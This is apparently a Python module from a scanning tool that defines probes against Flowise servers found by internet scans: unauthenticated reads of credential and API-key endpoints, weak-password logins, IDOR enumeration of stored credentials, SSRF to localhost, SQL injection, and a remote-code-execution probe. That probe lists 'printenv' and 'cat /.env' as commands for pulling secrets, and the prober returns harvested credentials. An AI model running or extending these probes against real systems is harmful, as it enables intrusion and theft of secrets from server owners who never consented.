"""Flowise prober — OAuth secrets, credentials, true IDOR, optional SSRF/RCE."""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential

from ..base import Prober
from ..capability import ProbeSpec, RiskLevel, VulnClass
from ._l2l3 import sqli_spec

log = logging.getLogger(__name__)

SPECS = [
    ProbeSpec(
        id="flowise.unauth",
        product="flowise",
        vuln_class=VulnClass.UNAUTH_READ,
        risk_level=RiskLevel.L0,
        cve_ids=("CVE-2026-56270",),
        entry={
            "paths": [
                "/api/v1/loginmethod",
                "/api/v1/credentials",
                "/api/v1/chatflows",
                "/api/v1/apikeys",
            ],
            "expand_params": {"organizationId": ["", "1", "default"]},
            "tag_prefix": "flowise",
        },
        max_requests=8,
    ),
    ProbeSpec(
        id="flowise.weak_password",
        product="flowise",
        vuln_class=VulnClass.WEAK_PASSWORD,
        risk_level=RiskLevel.L1,
        entry={
            "auth_style": "login_json",
            "login": "/api/v1/auth/login",
            "body": {"username": "{user}", "password": "{pass}"},
            "token_fields": ["token", "access_token"],
            "post_auth_paths": [
                "/api/v1/credentials",
                "/api/v1/chatflows",
                "/api/v1/apikeys",
            ],
        },
        max_requests=12,
    ),
    ProbeSpec(
        id="flowise.idor.chatflows",
        product="flowise",
        vuln_class=VulnClass.IDOR,
        risk_level=RiskLevel.L1,
        requires_auth=True,
        depends_on=("flowise.weak_password",),
        entry={
            "list": "/api/v1/chatflows",
            "object": "/api/v1/chatflows/{id}",
            "id_enum_max": 5,
            "id_fields": ["id", "_id", "chatflowId"],
            "use_auth": True,
        },
        max_requests=6,
    ),
    ProbeSpec(
        id="flowise.idor.credentials",
        product="flowise",
        vuln_class=VulnClass.IDOR,
        risk_level=RiskLevel.L1,
        requires_auth=True,
        depends_on=("flowise.weak_password",),
        entry={
            "list": "/api/v1/credentials",
            "object": "/api/v1/credentials/{id}",
            "id_enum_max": 5,
            "id_fields": ["id", "_id"],
            "use_auth": True,
        },
        max_requests=6,
    ),
    ProbeSpec(
        id="flowise.ssrf.fetch",
        product="flowise",
        vuln_class=VulnClass.SSRF,
        risk_level=RiskLevel.L2,
        entry={
            "path": "/api/v1/node-load-method/fetch",
            "method": "POST",
            "url_param": "url",
            "body": {},
            "target_urls": ["http://127.0.0.1/", "http://localhost/"],
            "use_auth": True,
        },
        requires_auth=False,
        max_requests=3,
    ),
    ProbeSpec(
        id="flowise.rce.proof",
        product="flowise",
        vuln_class=VulnClass.RCE,
        risk_level=RiskLevel.L3,
        entry={
            "path": "/api/v1/node-load-method/customFunction",
            "method": "POST",
            "param": "javascriptFunction",
            # Engine whitelist only accepts shell-like commands; product may
            # map this field differently — Spec is gated default-off.
            "proof_command": "echo aipocket-rce-proof",
            "secret_commands": ["printenv", "cat /.env"],
            "body": {},
            "use_auth": True,
        },
        max_requests=2,
    ),
    sqli_spec(
        "flowise",
        path="/api/v1/chatflows",
        param="name",
        use_auth=True,
        suffix="sqli_chatflows",
    ),
]


class FlowiseProber(Prober):
    product_name = "flowise"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "flowise" in blob or "flowiseai" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await self.run_specs(hit, SPECS)
